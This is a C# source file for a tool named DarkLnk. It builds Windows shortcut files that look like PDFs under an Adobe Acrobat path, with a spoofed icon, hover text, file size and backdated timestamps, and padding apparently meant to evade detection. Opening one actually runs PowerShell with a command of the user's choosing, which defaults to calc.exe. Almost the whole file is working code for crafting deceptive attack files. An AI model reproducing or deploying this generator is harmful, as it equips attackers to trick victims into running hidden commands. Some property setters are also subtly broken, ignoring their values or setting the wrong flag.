using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace DarkLnk
{
    public class DarkLnk
    {
        public int LinkSize 
        { 
            get { return _fakeSize; } 
            set { _fakeSize = value; } 
        }
        public string LinkExtension
        {
            get { return _fakeExtension; }
            set { 
                _fakeExtension = value;
                _fakeExtensionShort = value.Substring(0, 3);
            }
        }
        public string OutputName
        {
            get { return _outputName; }
            set
            {
                if (Regex.Match(value, @"[a-zA-Z0-9]+.lnk$").Success)
                {
                    _outputName = value.Substring(0,value.Length-4);
                }
                else
                {
                    _outputName = value;
                }
            }
        }
        public string Command
        {
            get { return _psCommand; }
            set { _psCommand = value; }
        }
        public string LinkPath
        {
            get { return _fakePath; }
            set { _fakePath = value; }
        }
        public bool RandomPadding
        {
            get { return _randomPadding; }
            set 
            { 
                _randomPadding = true;
                _nullPadding = false;
            }
        }
        public bool NullPadding
        {
            get { return _nullPadding; }
            set 
            { 
                _nullPadding = value;
                _randomPadding = false;
            }
        }
        public string RootDirectory
        {
            get { return _rootDir; }
            set
            {
                _rootDir = value.Substring(0,3); //Can only be 3 bytes

            }
        }
        public bool FakeTime
        {
            get { return _fakeTimes; }
            set
            {
                _nullPadding = value;
            }
        }
        public string Binary
        {
            get { return _realExecPath; }
            set
            {
                _realExecPath = value;

            }
        }

        private Random _r = new Random();
        private int _fakeSize = int.MaxValue;
        private string _fakePath = @"Program Files\Adobe\Acrobat";
        private string _fakeExtension = "pdf";
        private string _fakeExtensionShort = "pdf";
        private string _psCommand = "-command \"calc.exe\"";
        private string _outputName = "calc";
        private string _realExecPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
        private bool _randomPadding = false;
        private bool _nullPadding = false;
        private string _rootDir = @"C:\";
        private bool _fakeTimes = true;



        public void BuildLink()
        {
            byte[] LnkBytes = new byte[] { };
            byte[] linkHeader = new byte[] {
            0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x46, 0xAB, 0x00, 0x08, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00 }; //Lnk Header with all non pertinent data nulled out.



            //Intialize with Lnk Header
            LnkBytes = JoinBytes(LnkBytes, linkHeader);

            //Inject Fake Size if set
            if (_fakeSize != 0)
            {
                byte[] fksize = BitConverter.GetBytes(_fakeSize);
                LnkBytes = InjectBytes(LnkBytes, 52, fksize);
            }

            //Inject Fake Time if set
            if (_fakeTimes)
            {
                DateTime dt = DateTime.Now.AddDays(_r.Next(29, 600)*-1);
                LnkBytes = InjectBytes(LnkBytes, 28, Date2FileTime(dt)); //Creation Time
                LnkBytes = InjectBytes(LnkBytes, 28+8, Date2FileTime(dt.AddMinutes(_r.Next(1,30))));//Last Access Time
                LnkBytes = InjectBytes(LnkBytes, 28+16, Date2FileTime(dt.AddHours(_r.Next(1, 24))));//Last Write Time
            }

            

            //Add Link Item ID List
            LnkBytes = JoinBytes(LnkBytes,BuildItemIDList());

            //Add true execuable path.
            LnkBytes = JoinBytes(LnkBytes, BuildRealExecPath());

            //Write to disk
            File.WriteAllBytes($".\\{_outputName}.lnk", LnkBytes);

        }

        private byte[] JoinBytes(byte[] FirstBytes, byte[] SecondBytes)
        {
            byte[] result = new byte[FirstBytes.Length + SecondBytes.Length];
            Buffer.BlockCopy(FirstBytes, 0, result, 0, FirstBytes.Length);
            Buffer.BlockCopy(SecondBytes, 0, result, FirstBytes.Length, SecondBytes.Length);
            return result;
        } //Join two byte[]

        private byte[] InjectBytes(byte[] source, int position, byte[] injectbytes)
        {
            int resultsLength;

            //handle situation where the injected bytes would exceed the length of the source array.
            resultsLength = (injectbytes.Length + position) > source.Length ? (injectbytes.Length + position) : source.Length;


            byte[] results = new byte[] { };

            byte[] SourceA = new byte[position];
            byte[] SourceB = { };

            if (resultsLength <= source.Length)
            {
                SourceB = new byte[source.Length - position - injectbytes.Length];
            }


            if (resultsLength > source.Length)
            {
                results = new byte[resultsLength - injectbytes.Length];
                Array.Copy(source, 0, results, 0, position);
                results = JoinBytes(results, injectbytes);
            }
            else
            {
                Array.Copy(source, 0, SourceA, 0, position);
                Array.Copy(source, position + injectbytes.Length, SourceB, 0, source.Length - position - injectbytes.Length);
                results = JoinBytes(SourceA, injectbytes);
                results = JoinBytes(results, SourceB);
            }

                

            

            return results;
        } //Inject byte[] into byte[] @ position

        private byte[] BuildItemIDList()
        {
            //Will hold the total size of the ItemIdList
            int idListSize = 0;

            //TLDR; Default Item that uses a guid to point to a root directory.
            //https://winshl-kb.readthedocs.io/en/latest/sources/shell-folders/20d04fe0-3aea-1069-a2d8-08002b30309d.html
            byte[] shellLinkRootDirectoryItem = new byte[] {
            0x14, 0x00, 0x1F, 0x50, 0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10, 0xA2, 0xD8, 0x08,
            0x00, 0x2B, 0x30, 0x30, 0x9D };

            //Add other components of the Item Id List
            byte[] ExtensionItem = BuildExtensionItem();
            byte[] ExtentionPathItem = BuildFakePathItem();

            //Calculate ID List Size
            idListSize = shellLinkRootDirectoryItem.Length + ExtensionItem.Length + ExtentionPathItem.Length;
            byte[] totalSize = BitConverter.GetBytes(Convert.ToInt16(idListSize));

            //Build the entire Shell Link Item ID List
            byte[] results = new byte[] { };
            results = JoinBytes(results,totalSize);
            results = JoinBytes(results, shellLinkRootDirectoryItem);
            results = JoinBytes(results, ExtensionItem);
            results = JoinBytes(results, ExtentionPathItem);

            return results;
        }

        private byte[] BuildExtensionItem()
        {
            //For our purposes and style of link we will build a 25 char Item
            //This will affect what the link shows when the mouse hovers over.

            //Item Size
            UInt16 itemSize = 25;

            //Add root dir + extension 
            byte[] dataSection = new byte[23];
            byte[] shortExtension = Encoding.UTF8.GetBytes("/" + _rootDir.ToUpper());

            //Copy data into byte[] 
            Array.Copy(shortExtension, dataSection, shortExtension.Length);

            //Add size to the 23 byte data section and return.
            return JoinBytes(BitConverter.GetBytes(itemSize), dataSection);
        }

        private byte[] BuildFakePathItem()
        {
            //A continuation of what appears when the user hovers over the lnk file.
            //Anything can go here. HOWEVER the extension set here will dictate the
            //icon shown to the user.

            int itemSize = 0;
            byte[] result = new byte[] { };

            //Build sections of the item
            byte[] padding1 = new byte[] { 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] pathUtf8 = Encoding.UTF8.GetBytes(_fakePath + "." + _fakeExtension);


            byte[] padding2 = { };
            if (_randomPadding)
            {
                padding2 = GenerateRandomBinaryData(_r.Next(1, 2048), true, _r.Next(1, 32));
            }
            else if (_nullPadding)
            {
                padding2 = GenerateNullPadding(_r.Next(1, 2048));
            }
            else
            {
                padding2 = new byte[] { 0x00 };
            }


                byte[] pathUnicode = Encoding.Unicode.GetBytes(_fakePath + "." + _fakeExtension);
            byte[] termination = new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //Includes null bytes ending the Link ID List

            //Calculate item size
            itemSize = padding1.Length + pathUtf8.Length + padding2.Length + pathUnicode.Length + termination.Length;
            byte[] totalSize = BitConverter.GetBytes(Convert.ToInt16(itemSize));


            //Build item
            result = JoinBytes(result,totalSize);
            result = JoinBytes(result, padding1);
            result = JoinBytes(result, pathUtf8);
            result = JoinBytes(result, padding2);
            result = JoinBytes(result, pathUnicode);
            result = JoinBytes(result, termination);

            //return item
            return result;
        }

        private byte[] BuildRealExecPath()
        {
            //Here we build the item that will dictate which executable to run and the arguments to pass it.

            byte[] results = new byte[] { };
            byte[] header = new byte[] { 0x68, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 
                0x00, 0x1C, 0x00, 0x00, 0x00, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x67, 0x00, 
                0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0xA8, 0xAD, 0x24, 0x66, 0x10, 
                0x00, 0x00, 0x00, 0x00 }; //This has not been RE. It generally stays the same, so we're just going to keep it static.

            byte[] pathUtf8 = Encoding.UTF8.GetBytes(_realExecPath);
            byte[] padding1 = new byte[] {0x00, 0x00};

            byte[] padding2 = { }; //Padding 2 may not exceed 520 bytes and it must be even in length.
            if (_randomPadding)
            {
                padding2 = GenerateRandomBinaryData(_r.Next(1, 260)*2, true, _r.Next(2, 32));
            }
            else if (_nullPadding)
            {
                padding2 = GenerateNullPadding(_r.Next(1, 260)*2);
            }
            else
            {
                padding2 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            }



            byte[] padding2Length = BitConverter.GetBytes(Convert.ToInt16(padding2.Length / 2));
            byte[] argsUnicode = Encoding.Unicode.GetBytes(_psCommand);
            byte[] argsUnicodeLength = BitConverter.GetBytes(Convert.ToInt16(argsUnicode.Length / 2));

            //Build item
            results = JoinBytes(results, header);
            results = JoinBytes(results, pathUtf8);
            results = JoinBytes(results, padding1);
            results = JoinBytes(results, padding2Length);
            results = JoinBytes(results, padding2);
            results = JoinBytes(results, argsUnicodeLength);
            results = JoinBytes(results, argsUnicode);

            //fix size
            int headersize = 45 + pathUtf8.Length + 2;
            results = InjectBytes(results, 0, BitConverter.GetBytes(headersize));


            //return item
            return results;
        }

        private byte[] GenerateRandomBinaryData(int length,bool nullPadding = true, int paddingLength = 1)
        {
            
            byte[] data = new byte[length];
            int startPoint = nullPadding ? paddingLength : 0;
            int endPoint = nullPadding ? paddingLength : 0;

            for (int i=startPoint; i< (length - endPoint); i++)
            {
                data[i] = (byte)_r.Next(1, 256);
            }
            return data;
        }

        private byte[] GenerateNullPadding(int length)
        {

            byte[] data = new byte[length];

            for (int i = 0; i < length; i++)
            {
                data[i] = (byte)0;
            }
            return data;
        }


        public static byte[] Date2FileTime(DateTime dateTime)
        {
            long fileTime = dateTime.ToFileTime();
            return BitConverter.GetBytes(fileTime); // Little-endian by default
        }

    }
}
